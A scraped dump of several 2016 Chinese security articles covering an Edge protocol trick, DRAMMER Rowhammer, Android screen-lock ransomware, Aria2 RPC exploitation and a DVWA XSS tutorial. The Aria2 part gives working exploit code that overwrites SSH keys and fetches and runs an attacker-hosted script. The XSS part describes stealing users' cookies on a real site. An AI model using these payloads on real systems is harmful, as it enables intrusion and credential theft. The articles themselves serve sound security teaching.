我们也在删除逗号之前的垃圾，看起来似乎无关（虽然他值得进行更多研究）。我们快速分离，重启 Edge，并运行我们的新代码。url = ""read:,c:\\windows\\system32\\drivers\\etc\\hosts"";w = window.open(url, """", ""width=300,height=300"");  如预期所想，在新窗口中加载本地文件并没有崩溃。[ PoC – Open hosts on MS Edge ]跟着 bug hunter，我将在此停顿，但我详细所有的这些事情值得更多的研究，取决于你获得的乐趣了：A）枚举所有可加载的协议，并通过请求字符串攻击应用程序B) 使用 microsoft-edge: 绕过 HTML5 沙盒，弹出窗口拦截器和不知谁知道的东西。C) 继续使用 read: 协议。我们找到了一种方法来阻止它崩溃，但记住有一个函数 SHCreateStreamOnFileEx 期望我们能够影响的东西！这值得更多尝试。此外，我们可以继续在参数上做点事情，看看是否使用逗号分隔参数等等。如果调试二进制无聊至极，那么你仍然可以尝试对阅读视图进行 XSS。","2016-11-29 12:35:32","Web安全","利用特殊协议加载本地文件， 绕过 HTML5 沙箱， 打开弹窗诸事","http://nsoad.com/Article/web/20161129/860.html"
"5ccbfa084f2f0a0a7a69c001","近期，安全研究专家通过研究发现了一种root安卓手机的新方法，即通过Rowhammer漏洞来root安卓手机。除此之外，攻击者甚至还可以用这个漏洞配合目前已知的安卓系统漏洞（Ban","Kong","近期，安全研究专家通过研究发现了一种root安卓手机的新方法，即通过Rowhammer漏洞来root安卓手机。除此之外，攻击者甚至还可以用这个漏洞配合目前已知的安卓系统漏洞（Bandroid和Stagefright）来对目标用户实施攻击。在去年年初，Google公司ProjectZero项目组的安全研究专家发现，攻击者可以通过内存中的一个设计缺陷来劫持安装了Linux系统的计算机，并获取到目标系统内核的高级权限。现在，攻击者又可以利用这个设计缺陷来root成千上万的安卓手机了。在此之前，阿姆斯特丹自由大学VUSec安全实验室的研究人员发现了一种名为Rowhammer的攻击方式，攻击者或可通过这种攻击方法来攻击目标设备的动态随机存储器（DRAM）。虽然我们早就已经熟知Rowhammer攻击了，但是这却是安全研究专家第一次将该攻击应用到移动设备上。针对动态随机存储器（DRAM）的Rowhammer攻击到底是什么？针对移动设备的Rowhammer攻击杀伤力同样非常巨大，在Google开发出相应补丁之前，这个问题将会使数百万安卓手机中的重要数据陷于安全风险之中。当攻击者尝试发起Rowhammer攻击时，他需要执行一款恶意软件，并通过这款恶意软件来重复访问内存芯片中的某一行晶体管，而攻击的第二步被称为“敲击”（Hammering）。当恶意软件对某一块内存区域进行“敲击”时会影响相邻的内存行，并引起电荷泄漏。而这种电磁干扰最终将会导致其他行的内存数据发生比特（bit）翻转。在这种情况下，内存中的数据将会被改变，而也这就成为了一种获取设备控制权的新方法。简单来说，Rowhammer攻击指的是在新一代DRAM芯片上反复访问一行内存，而这种操作将有可能造成相邻内存行的数据发生比特翻转，这种攻击技术将允许任何人修改设备内存中保存的数据内容。Project Zero项目组在其发表的研究报告中写到：“现在DRAM的制造精度越来越高，部件在物理层面上越来越小。所以对于生产商而言，既要在一块芯片上集成更大的内存容量，又要让各个内存单元之间不发生电磁干扰，其实是非常难做到的。这一情况所产生的后果为：对内存单个区域进行的读写将有可能干扰到邻近的内存区域，导致电流流入或流出邻近的内存单元。如果反复进行大量的读写操作，将有可能改变邻近内存单元的内容，使得原始的比特数据0变成1，或者1变成0。”你的安卓手机会受影响吗？为了在安卓手机中测试Rowhammer攻击，安全研究专家构建出了一种全新的漏洞利用PoC，即DRAMMER。通过测试发现，这种新型的漏洞利用方法不仅可以成功地修改很多热门手机中的数据，而且还可以成功地root这些安卓手机。研究人员成功root的安卓手机包括Google的Nexus 4和Nexus 5，LG的G4，三星GalaxyS4和GalaxyS5，摩托罗拉的MotoG（2013/2014），以及国产的一加手机。但不排除还有其他品牌的安卓手机也会受到DRAMMER攻击的影响。安全研究专家在测试报告中写到【PDF】：“我们所设计出的DRAMMER攻击足以证明，Rowhammer攻击对于数十亿的移动用户来说绝对是一个真正的安全威胁。不仅如此，我们的实验还表明，Rowhammer攻击不仅可以入侵x86平台，而且对于移动设备也同样适用。”DRAMMER攻击的工作机制为了利用这个漏洞，安全研究人员专门开发了一款恶意软件，其中包含有相应的漏洞利用代码（见文末链接）。为了避免被反病毒软件检测到，这款恶意软件不需要获取任何特殊的用户权限即可root目标手机。但是，为了成功执行DRAMMER攻击，我们还得让用户去下载这个包含漏洞利用代码的恶意软件。为了实现攻击，研究人员还需要通过安卓系统中一个名为“ION内存分配/管理”的机制来获取到DRAM的直接访问权。除了可以为每一个应用程序提供DRAM的直接访问权之外，ION内存管理器还可以允许应用程序识别DRAM的相邻行内存空间，而这也是让内存数据发生比特翻转的重要前提。了解到这些信息之后，研究人员就得想办法如何利用“比特翻转”来root目标设备了。在获取到目标手机的完整控制权之后，他们就可以从目标手机中提取出任何数据了。安全研究人员表示：“简而言之，我们的攻击方法主要通过耗尽不同大小的内存块来使物理内存分配程序进入一种工作状态，在这种状态下，它就会使用我们可以预测到的内存区域来填补被耗尽的那部分内存空间。接下来，我们就可以控制内存分配程序来将目标设备中的敏感数据（例如一张内存页表）转移至一块容易进行比特翻转的物理内存中。这样一来，我们就可以通过DRAMMER来进行攻击了。”当目标设备下载并安装了我们的恶意软件之后，DRAMMER漏洞利用代码便会在几分钟之内接管目标手机（有时只需几秒钟），而且整个过程完全不需要任何的用户交互。即便是当你在使用其他应用或者将手机调成“睡眠”模式时，攻击过程仍然不会停止。目前还没有可行的解决方案安全研究专家已经在今年的七月份就已经将关于该漏洞的信息提交给了Google公司。Google公司已经将该漏洞归类为了“高危漏洞”，根据漏洞奖励计划的规定，Google为这些研究专家提供了四千美金的漏洞奖励。Google表示，公司在获取到了关于该漏洞的详细信息之后便通知了相关的合作厂商。在十一月份的安全更新公告中，Google将会向广大用户提供能够缓解DRAMMER攻击的解决方案。但是安全研究人员警告称，目前用户手中的安卓智能手机其内存芯片是否无法更换的，因此这个安全问题在短时间内将无法得到彻底的修复。除此之外，DRAMMER攻击还会利用操作系统中其他的一些基础功能，如果要移除或修改这些基本功能的话，用户的体验性将会大大降低。简而言之，下一代安卓智能手机是很难去修复这个问题的。攻击演示+漏洞PoC安全研究专家总共公布了两份PoC视频，并且在视频中演示了如何对LGNexus 5来进行DRAMMER攻击。在第一份视频中，测试手机运行的是Android6.0.1，并且安装了Google在10月5日所发布的安全补丁。在第二段视频中，研究人员演示了如何使用Stagefright漏洞配合DRAMMER攻击来入侵一些未打补丁的老款安卓手机。安全研究人员演示了针对Android6.0.1的DRUMMER攻击：    StageFright+DRAMMER攻击演示视频：漏洞利用源代码：漏洞利用源代码","2016-10-31 15:39:46","移动安全","如何利用Rowhammer漏洞Root Android手机（含演示视频+Exploit源码）","http://nsoad.com/Article/MobileSecurity/20161031/675.html"
"5ccbfa084f2f0a0a7a69c002","根据猎豹移动针对全球手机用户的数据统计，霸屏类病毒在最近两个月有蔓延的势头，尤其在俄罗斯、墨西哥等一些国家，危害极其严重。全球每天的感染手机在3万台以上。    霸屏","blackhold","根据猎豹移动针对全球手机用户的数据统计，霸屏类病毒在最近两个月有蔓延的势头，尤其在俄罗斯、墨西哥等一些国家，危害极其严重。全球每天的感染手机在3万台以上。    霸屏类病毒概况霸屏类病毒全球感染量在不同的地区分布不尽相同，其中以俄罗斯最高：国内也是霸屏类病毒的重灾区之一，每天大概都有3000左右的中毒用户：“霸屏勒索”类病毒是手机用户感知较重的一类病毒，其主要行为为：1、通过设置窗口的flag，显示一个置顶的窗口，让用户无法通过屏幕来操作手机2、循环显示激活设备管理器界面，要求用户激活设置管理器3、激活设备管理器后重置、更改屏幕解锁密码4、留下病毒作者的相关联系方式，勒索用户钱财中毒截屏国内霸屏病毒一般伪装为QQ刷钻、游戏辅助工具和一些其它色情、黑客工具等，诱导用户下载安装。 Q币活动助手      cf辅助器      A片播放器  Q币刷取器-破解版      cf刷枪软件      DDos攻击  QQ强制封号系统      酷跑刷钻      最新一键免流  QQ强红包      球球大作战辅助      终极短信轰炸  空间赞破解版      全民枪战破解导入      锁机生成器  QQ卡永久业务      烧饼修改器（免root）      手机轰炸机  红包快抢      天天酷跑卡钻      爱奇艺VIP版  QQ防撤回      王者荣耀盒子      爱奇艺破解版  ……      ……      ……国外样本主要伪装为以下类型App：霸屏病毒的技术解析一般霸屏方式包括：Ø  TYPE_SYSTEM_ERRORAdded in API level 1intTYPE_SYSTEM_ERRORWindow type: internal systemerror windows, appear on top of everything they can. In multiuser systems showsonly on the owning user's window.Constant Value: 2010(0x000007da)内部系统内部错误窗口，置于所有窗口的前端Ø  FLAG_FULLSCREEN|FLAG_LAYOUT_IN_SCREENFLAG_FULLSCREENAdded in API level 1intFLAG_FULLSCREENWindow flag: hide all screendecorations (such as the status bar) while this window is displayed. Thisallows the window to use the entire display space for itself -- the status barwill be hidden when an app window with this flag set is on the top layer.    Afullscreen window will ignore a value ofSOFT_INPUT_ADJUST_RESIZE for the window's softInputMode field;    the window willstay fullscreen and will not resize.Constant Value: 1024(0x00000400)隐藏屏幕上所有内容，允许当前窗口使用整个屏幕FLAG_LAYOUT_IN_SCREENAdded in API level 1intFLAG_LAYOUT_IN_SCREENWindow flag: place the windowwithin the entire screen, ignoring decorations around the border (such as thestatus bar). The window must correctly position its contents to take the screendecoration into account. This flag is normally set for you by Window    asdescribed in setFlags(int, int).Constant Value: 256(0x00000100)将窗口置于整个屏幕 Ø TYPE_PHONEAdded in API level 1intTYPE_PHONEWindow type: phone. These are non-applicationwindows providing user interaction with the phone (in particular incomingcalls). These windows are normally placed above all applications, but behindthe status bar. In multiuser systems shows on all users'    windows.Constant Value: 2002 (0x000007d2)来电话的时候会被覆盖，其它情况下在最前端，显示位置在状态栏下面Ø TYPE_TOASTAdded in API level 1intTYPE_TOASTWindow type: transientnotifications. In multiuser systems shows only on the owning user's window.Constant Value: 2005(0x000007d5)不属于悬浮窗, 但有悬浮窗的功能，显示于顶层Ø  循环获取顶层Activity，不是自己则杀掉并启动自己的Activity Ø  获取设置管理器权限后更改/设置锁屏密码以上各种方式中以循环显示Activity和Flag TYPE_SYSTEM_ERROR为主要利用方式，比例如下：即大部分霸屏的病毒使用的都是TYPE_SYSTEM_ERROR这个Flag预防与应对措施预防：1、  平时不要安装/打开未知来源应用2、  不要随便给未知软件设备管理器权限3、  打开USB调试与电脑关联，必要的时候可通过其它方式卸载4、  爱折腾的用户可以刷入第三方recovery，如TWRP处理：1、  手机如果开启了USB调试，可在电脑上执行如下命令卸载pm list packages -3找出病毒的包名pm uninstall ‘pkg’ 来卸载2、  重启进入recovery，利用第三方recovery的文件管理功能来删除/data/app/’pkg’里的apk文件3、  如果激活了设备管理器，打开了USB调试并且手机已经root可以强制删除病毒程序及存储锁屏密码的文件达到清除的目的a)        sub)        rm –r /data/app/’pkg’目录c)        rm /data/system/password.keyd)        rm /data/system/gesture.keye)        reboot","2016-11-08 17:01:20","移动安全","席卷全球的“霸屏”病毒：技术分析与处理","http://nsoad.com/Article/MobileSecurity/20161108/720.html"
"5ccbfa084f2f0a0a7a69c003","在未设置任何安全措施的情况下，Aria2 RPC Server 可以接受任何未知来源的请求指令，并予以下载。","blackhold","Author：ricterzABSTRACT在未设置任何安全措施的情况下，Aria2 RPC Server 可以接受任何未知来源的请求指令，并予以下载。即使存在诸如--rpc-secret、--rpc-user、--rpc-passwd之类的安全措施，也可以通过社会工程学手段进行攻击。通过 Aria2 RPC Server，可以进行 SSRF、Arbitrary File Write 等 Web 攻击手法，获取服务器权限。1. INTERDUCTIONAria2 是一个命令行下运行、多协议、多来源下载工具（HTTP/HTTPS、FTP、BitTorrent、Metalink），内建 XML-RPC 用户界面。[1] Aria 提供 RPC Server，通过--enable-rpc参数启动。Aria2 的 RPC Server 可以方便的添加、删除下载项目。2. ATTACK TECHNIQUES2.1 Arbitary File Write通过控制文件下载链接、文件储存路径以及文件名，可以实现任意文件写入。同时通过 Aria2 提供的其他功能，诸如 save-session 等也能轻易地实现向任意文件写入指定功能。2.1.1 Bypass --auto-file-renaming and --allow-overwrite根据 Aria2 RPC Server 的文档 changeGlobalOption 方法支持修改部分全局设置参数。[2] 通过修改 allow-overwrite 参数即可实现绕过自动重命名，且可以直接覆盖指定文件。 即使不修改 allow-overwrite，也可以通过其他方式，比如指定 session 文件路径来覆盖目标文件。2.1.2 Overwrite .ssh/authorized_keys By Download File在类 Unix 系统上，持有储存在某用户目录下的 .ssh/authorized_keys 文件中的公钥所对应的私钥的用户可以通过 ssh 直接远程无密码登陆此系统。[3] 如果攻击者可以通过 Aria2 覆盖 .ssh/authorized_keys 文件的话，那么攻击者可以轻易地取得目标系统的权限。s = PatchedServerProxy(""http://victim:6800/rpc"")  pprint(s.aria2.addUri(['http://attacker/pubkey.txt'], {'out': 'authorized_keys', 'dir': '/home/bangumi/.ssh/'}))通过覆盖 .ssh/authorized_keys，成功登陆到目标服务器。2.1.3 Overwrite .ssh/authorized_keys By save-session老版本 Aria2 Aria2 RPC Server 提供 save-session 选项，可以指定在 aria2c 关闭时保存当前下载文件的状态；同时 Aria2 RPC Server 提供 user-agent 选项，可以指定下载文件的 UA。[2] Aria2 session 格式为：http://download-server/1.txt   gid=79e8977d817e750e dir=/home/bangumi/.aria2/ out=1.txt allow-overwrite=true user-agent=aria2/1.21.1Aria2 未处理 \n 换行符，可以精心构造 user-agent 来伪造 session 文件，不过这偏离讨论范围。由于 .ssh/authorized_keys 存在容错性，所以可以设置 session 路径为 .ssh/authorized_keys，注入攻击者的 public key 来进行攻击。pk = ""ssh-rsa .... root@localhost""  s = PatchedServerProxy(""http://victim/rpc"")  pprint(s.aria2.changeGlobalOption({""allow-overwrite"": ""true"", ""user-agent"": ""\n\n"" + pk + ""\n\n"", ""save-session"": ""/home/bangumi/.ssh/authorized_keys""}))  pprint(s.aria2.getGlobalOption())  pprint(s.aria2.addUri(['http://download-server/1.txt'], {}))  pprint(s.aria2.shutdown())攻击完成后 aria2 关闭，session 文件储存在指定目录。新版本 Aria2 新版本的 Aria2 提供了 aria2.saveSession 方法，可以在避免关闭 aria2 的情况下储存 session。pk = ""ssh-rsa .... root@localhost""  s = PatchedServerProxy(""http://victim/rpc"")  pprint(s.aria2.changeGlobalOption({""user-agent"": ""\n\n"" + pk + ""\n\n"", ""save-session"": ""/home/bangumi/.ssh/authorized_keys""}))  pprint(s.aria2.getGlobalOption())  pprint(s.aria2.addUri(['http://download-server/1.txt'], {}))  pprint(s.aria2.saveSession())2.1.3 Overwrite Aria2 Configuire FileAria2 提供 --on-download-complete 选项，可以指定下载完成时需要运行的程序。[2] 调用程序的参数为：hook.sh $1      $2      $3  hook.sh GID     文件编号 文件路径其中 GID 为 Aria2 自动生成的编号，文件编号通常为 1。--on-download-complete 选项传入的 COMMAND 需要为带有可执行权限的命令路径。 为了执行命令，我们需要寻找一个可以执行第三个参数路径所指向的文件的 COMMAND，不过不幸的是，Linux 下并没有找到类似的 COMMAND。由于前两个参数不可控，且未知，但是 GID 在 Aria2 添加任务的时候就已经返回，所以我们用一个比较取巧的方法执行命令。 首先下载恶意的 aria2 配置文件，并覆盖原本的配置文件，等待 aria2 重新加载配置文件。然后下载一个大文件，得到 GID 后立即暂停，接着下载一个小文件，使得小文件保存的文件名为大文件的 GID，最后再开启大文件的下载，即可执行任意命令。s = PatchedServerProxy(""http://victim/rpc"")  pprint(s.aria2.changeGlobalOption({""allow-overwrite"": ""true""}))  pprint(s.aria2.getGlobalOption())  # pprint(s.aria2.addUri(['http://attacker/1.txt'], {'dir': '/tmp', 'out': 'authorized_keys'}))pprint(s.aria2.addUri(['http://attacker/1.txt'], {'dir': '/home/bangumi/.aria2/', 'out': 'aria2.conf'}))  raw_input('waiting for restart ...')  r = str(s.aria2.addUri(['http://attacker/bigfile'], {'out': '1'}))  s.aria2.pause(r)  pprint(s.aria2.addUri(['http://attacker/1.sh'], {'out': r}))  s.aria2.unpause(r)下载完成后，Aria2 将会执行如下命令：/bin/bash GID 1 /path/to/file由于 GID 我们已知，且存在名为 GID 的文件，调用时路径基于当前目录，所以可以成功执行。2.2 SSRFScan Intranet HTTP Service 利用 Aria2 下载文件的特性，且对于下载的地址未限制，所以可以通过 Aria2 对于内网资源进行请求访问。def gen():      return ['http://172.16.98.%d/' % (i,) for i in range(0, 255)]def main():      s = ServerProxy(""http://victim/rpc"")    t = [s.aria2.addUri([i], {'dir': '/tmp'}) for i in gen()]    pprint(s.aria2.changeGlobalOption({'max-concurrent-downloads': '50', 'connect-timeout': '3', 'timeout': '3'}))    pprint(s.aria2.getGlobalOption())    while 1:        for f in t:            pprint(s.aria2.getFiles(f))利用如上代码可对于内网资源进行扫描。 Attack Redis Server Aria2 的 user-agent 未过滤 \n，可以通过换行来攻击内网 Redis Server。[4]payload = '''  CCONFIG SET DIR /root/.ssh  CCONFIG SET DBFILENAME authorized_keys  SSET 1 ""\\n\\n\\nssh-rsa .... root@localhost\\n\\n""  SSAVE  QQUIT  '''  s = ServerProxy(""http://victom/rpc"")  s.aria2.changeGlobalOption({'user-agent': payload})  pprint(s.aria2.addUri(['http://127.0.0.1:6379/'], {'dir': '/tmp'}))攻击成功后，/root/.ssh/authorized_keys 被覆盖，可通过 ssh 无密码登陆。3. MITIGATION TECHNIQUES3.1 CLI OPTIONS--rpc-listen-all：最好关闭此项功能--allow-overwrite：应当关闭此项功能--auto-file-renaming：应当开启此项功能--rpc-secret：应当开启此项功能3.2 PERMISSIONS通过 nobody 用户运行 aria2cREFERENCESAria2 - Ubuntu中文. http://wiki.ubuntu.org.cn/Aria2aria2c(1) - aria2 1.29.0 documentation. https://aria2.github.io/manual/en/html/aria2c.htmlSecure Shell - Wikipedia. https://en.wikipedia.org/wiki/Secure_Shell利用 gopher 协议拓展攻击面. https://ricterz.me/posts/利用%20gopher%20协议拓展攻击面来源链接：https://ricterz.me/posts/Hacking%20Aria2%20RPC%20Daemon","2016-11-22 17:32:50","Web安全","Hacking Aria2 RPC Daemon","http://nsoad.com/Article/web/20161122/835.html"
"5ccbfa084f2f0a0a7a69c004","目前，最新的DVWA已经更新到1.9版本（http://www.dvwa.co.uk/），而网上的教程大多停留在旧版本，且没有针对DVWA high级别的教程.","Kong","目前，最新的DVWA已经更新到1.9版本（http://www.dvwa.co.uk/），而网上的教程大多停留在旧版本，且没有针对DVWA high级别的教程，因此萌发了一个撰写新手教程的想法，错误的地方还请大家指正。DVWA简介DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。DVWA共有十个模块，分别是Brute Force（暴力（破解））Command Injection（命令行注入）CSRF（跨站请求伪造）File Inclusion（文件包含）File Upload（文件上传）Insecure CAPTCHA （不安全的验证码）SQL Injection（SQL注入）SQL Injection（Blind）（SQL盲注）XSS（Reflected）（反射型跨站脚本）XSS（Stored）（存储型跨站脚本）需要注意的是，DVWA 1.9的代码分为四种安全级别：Low，Medium，High，Impossible。初学者可以通过比较四种级别的代码，接触到一些PHP代码审计的内容。DVWA的搭建Freebuf上的这篇文章《新手指南：手把手教你如何搭建自己的渗透测试环境》（http://www.freebuf.com/sectool/102661.html）已经写得非常好了，在这里就不赘述了。本篇为完结篇，介绍XSS模块的相关内容，之前的教程：Brute Force Command Injection CSRF File Inclusion File Upload Insecure CAPTCHA SQL Injection SQL Injection（Blind）                                                                                  XSSXSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。DOM型的XSS由于其特殊性，常常被分为第三种，这是一种基于DOM树的XSS。例如服务器端经常使用document.boby.innerHtml等函数动态生成html页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生DOM型的XSS。DOM型XSS可能是存储型，也有可能是反射型。（注：下面的实验都是在Firefox浏览器下进行的，感谢火狐没做XSS filter）反射型XSS下面对四种级别的代码进行分析。Low服务器端核心代码&lt;?php // Is there any input? if( array_key_exists( ""name"", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) {     // Feedback for end user     echo '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;'; } ?&gt;可以看到，代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞。漏洞利用         输入&lt;script&gt;alert(/xss/)&lt;/script&gt;，成功弹框：    相应的XSS链接：http://192.168.153.130/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(/xss/)%3C%2Fscript%3E#Medium服务器端核心代码&lt;?php // Is there any input? if( array_key_exists( ""name"", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) {     // Get input     $name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] );     // Feedback for end user     echo ""&lt;pre&gt;Hello ${name}&lt;/pre&gt;""; } ?&gt;可以看到，这里对输入进行了过滤，基于黑名单的思想，使用str_replace函数将输入中的&lt;script&gt;删除，这种防护机制是可以被轻松绕过的。漏洞利用         1.双写绕过输入&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt;，成功弹框：     相应的XSS链接：http://192.168.153.130/dvwa/vulnerabilities/xss_r/?name=%3Csc%3Cscript%3Eript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E#2.大小写混淆绕过输入&lt;ScRipt&gt;alert(/xss/)&lt;/script&gt;，成功弹框：     相应的XSS链接：http://192.168.153.130/dvwa/vulnerabilities/xss_r/?name=%3CScRipt%3Ealert(%2Fxss%2F)%3C%2Fscript%3E#High服务器端核心代码&lt;?php // Is there any input? if( array_key_exists( ""name"", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) {     // Get input     $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );     // Feedback for end user     echo ""&lt;pre&gt;Hello ${name}&lt;/pre&gt;""; } ?&gt;可以看到，High级别的代码同样使用黑名单过滤输入，preg_replace() 函数用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中i表示不区分大小写）不再有效。漏洞利用         虽然无法使用&lt;script&gt;标签注入XSS代码，但是可以通过img、body等标签的事件或者iframe等标签的src注入恶意的js代码。输入&lt;img src=1 onerror=alert(/xss/)&gt;，成功弹框：  相应的XSS链接：http://192.168.153.130/dvwa/vulnerabilities/xss_r/?name=%3Cimg+src%3D1+onerror%3Dalert%28%2Fxss%2F%29%3E#Impossible服务器端核心代码&lt;?php // Is there any input? if( array_key_exists( ""name"", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) {     // Check Anti-CSRF token     checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );     // Get input     $name = htmlspecialchars( $_GET[ 'name' ] );     // Feedback for end user     echo ""&lt;pre&gt;Hello ${name}&lt;/pre&gt;""; } // Generate Anti-CSRF token generateSessionToken(); ?&gt;可以看到，Impossible级别的代码使用htmlspecialchars函数把预定义的字符&amp;、”、        ’、&lt;、&gt;转换为 HTML 实体，防止浏览器将其作为HTML元素。存储型XSS下面对四种级别的代码进行分析。Low服务器端核心代码&lt;?php if( isset( $_POST[ 'btnSign' ] ) ) {     // Get input     $message = trim( $_POST[ 'mtxMessage' ] );     $name    = trim( $_POST[ 'txtName' ] );     // Sanitize message input     $message = stripslashes( $message );     $message = mysql_real_escape_string( $message );     // Sanitize name input     $name = mysql_real_escape_string( $name );     // Update database     $query  = ""INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"";     $result = mysql_query( $query ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' );     //mysql_close(); } ?&gt;相关函数介绍trim(string,charlist)函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括、\t、\n、\x0B、\r以及空格，可选参数charlist支持添加额外需要删除的字符。mysql_real_escape_string(string,connection)函数会对字符串中的特殊符号（\x00，\n，\r，\，‘，“，\x1a）进行转义。stripslashes(string)函数删除字符串中的反斜杠。可以看到，对输入并没有做XSS方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型XSS漏洞。漏洞利用         message一栏输入&lt;script&gt;alert(/xss/)&lt;/script&gt;，成功弹框：       name一栏前端有字数限制，抓包改为&lt;script&gt;alert(/name/)&lt;/script&gt;：成功弹框：        Medium服务器端核心代码&lt;?php if( isset( $_POST[ 'btnSign' ] ) ) {     // Get input     $message = trim( $_POST[ 'mtxMessage' ] );     $name    = trim( $_POST[ 'txtName' ] );     // Sanitize message input     $message = strip_tags( addslashes( $message ) );     $message = mysql_real_escape_string( $message );     $message = htmlspecialchars( $message );     // Sanitize name input     $name = str_replace( '&lt;script&gt;', '', $name );     $name = mysql_real_escape_string( $name );     // Update database     $query  = ""INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"";     $result = mysql_query( $query ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' );     //mysql_close(); } ?&gt;相关函数说明strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用&lt;b&gt;标签。addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。可以看到，由于对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码，但是对于name参数，只是简单过滤了&lt;script&gt;字符串，仍然存在存储型的XSS。漏洞利用         1.双写绕过抓包改name参数为&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt;:       成功弹框：      2.大小写混淆绕过抓包改name参数为&lt;Script&gt;alert(/xss/)&lt;/script&gt;:   成功弹框：  High服务器端核心代码&lt;?php if( isset( $_POST[ 'btnSign' ] ) ) {     // Get input     $message = trim( $_POST[ 'mtxMessage' ] );     $name    = trim( $_POST[ 'txtName' ] );     // Sanitize message input     $message = strip_tags( addslashes( $message ) );     $message = mysql_real_escape_string( $message );     $message = htmlspecialchars( $message );     // Sanitize name input     $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );     $name = mysql_real_escape_string( $name );     // Update database     $query  = ""INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"";     $result = mysql_query( $query ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' );     //mysql_close(); } ?&gt;可以看到，这里使用正则表达式过滤了&lt;script&gt;标签，但是却忽略了img、iframe等其它危险的标签，因此name参数依旧存在存储型XSS。High抓包改name参数为&lt;img src=1 onerror=alert(1)&gt;：     成功弹框：   Impossible服务器端核心代码&lt;?php if( isset( $_POST[ 'btnSign' ] ) ) {     // Check Anti-CSRF token     checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );     // Get input     $message = trim( $_POST[ 'mtxMessage' ] );     $name    = trim( $_POST[ 'txtName' ] );     // Sanitize message input     $message = stripslashes( $message );     $message = mysql_real_escape_string( $message );     $message = htmlspecialchars( $message );     // Sanitize name input     $name = stripslashes( $name );     $name = mysql_real_escape_string( $name );     $name = htmlspecialchars( $name );     // Update database     $data = $db-&gt;prepare( 'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );' );     $data-&gt;bindParam( ':message', $message, PDO::PARAM_STR );     $data-&gt;bindParam( ':name', $name, PDO::PARAM_STR );     $data-&gt;execute(); } // Generate Anti-CSRF token generateSessionToken(); ?&gt;可以看到，通过使用htmlspecialchars函数，解决了XSS，但是要注意的是，如果htmlspecialchars函数使用不当，攻击者就可以通过编码的方式绕过函数进行XSS注入，尤其是DOM型的XSS。最后附赠最近遇到的一个实例：一次有趣的XSS+CSRF组合拳0×01 前言最近执着于渗透各种xx人才网，前两天在某网站上发现了一个极其鸡肋的XSS漏洞，本来以为没有太大的利用价值，没想到结合CSRF攻击，却获得了意想不到的效果。0×02 一个鸡肋的XSS漏洞下面是某个招聘网站的用户个人资料界面：用户可以在这里修改自己的基本资料并保存，经过XSS测试，这里的输入都过滤了成对的尖括号（&lt; &gt;）、script、img、&amp;等字符，但是似乎遗漏了事件，于是尝试使用input标签的onchange事件注入XSS代码。在通讯地址一栏输入” onchange=alert(2) “并保存，刷新页面，右键查看源码，注入成功：     只要尝试在通讯地址一栏中输入新的内容，就会触发XSS，弹框：       是的，成功触发XSS代码了，可是这个鸡肋的XSS漏洞有什么卵用呢？首先，这个XSS漏洞依赖事件触发，只有用户在修改个人资料时恶意代码才有可能执行，其次这是一个存储型的XSS漏洞，你不可能要求用户按照攻击者的意思，事先在自己的个人资料里键入XSS代码并保存吧。0×03 CSRF带来的曙光在修改个人资料的过程中，抓包发现这个修改接口并没有任何的防CSRF机制，存在明显的CSRF漏洞：         这给鸡肋的XSS漏洞带来了曙光，于是想到了可以结合CSRF攻击实现用户cookie的大面积盗取。攻击思路如下：1.构造一个CSRF攻击页面，诱使用户访问（在这种招聘网站，发布一个包含恶意页面的虚假招聘很容易做到）2.用户访问页面后，个人基本资料会被清空，同时注入XSS代码3.用户尝试补全个人资料，触发XSS代码，自动发送cookie0×04 攻击演示下面是构造的CSRF攻击页面： 调皮地把cookie发（这里调皮地把cookie发给百度= =）下面是本地的攻击过程演示：1.受害者进入攻击页面，会看到“你的基本资料被我清空了”的提示：还会看到资料修改成功的提示，并跳转：    2.这时候受害者会发现自己的个人资料被清空了：    却不知道已经被注入了XSS代码：3.当用户尝试修改通讯地址一栏时，就会触发XSS代码，自动发送cookie（其中包含用户id、用户名、密码哈希值、session-id）        ：    这样，大规模盗取用户cookie的攻击也就完成了。","2016-12-26 14:36:05","Web安全","新手指南：DVWA-1.9全级别教程（完结篇，附实例）之XSS","http://nsoad.com/Article/web/20161226/937.html"
